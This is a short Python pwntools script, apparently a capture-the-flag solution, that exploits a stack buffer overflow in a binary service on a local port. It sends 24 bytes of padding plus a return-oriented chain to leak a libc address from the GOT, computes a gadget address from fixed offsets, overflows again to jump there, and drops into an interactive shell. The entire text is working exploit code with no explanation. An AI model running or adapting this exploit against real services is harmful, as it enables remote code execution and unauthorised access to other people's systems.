from pwn import *

#p = process('./binary')

p = remote('127.0.0.1', 15877)
p.recvline()

p.sendline('A'*24+p64(0x40121b)+p64(0x404018)+p64(0x0000000000401030)+p64(0x0000000000401060))

x = int(p.recvline()[:-1][::-1].encode('hex'), 16)-0x71910+0x4484f

p.sendline('A'*24+p64(x))

p.interactive()
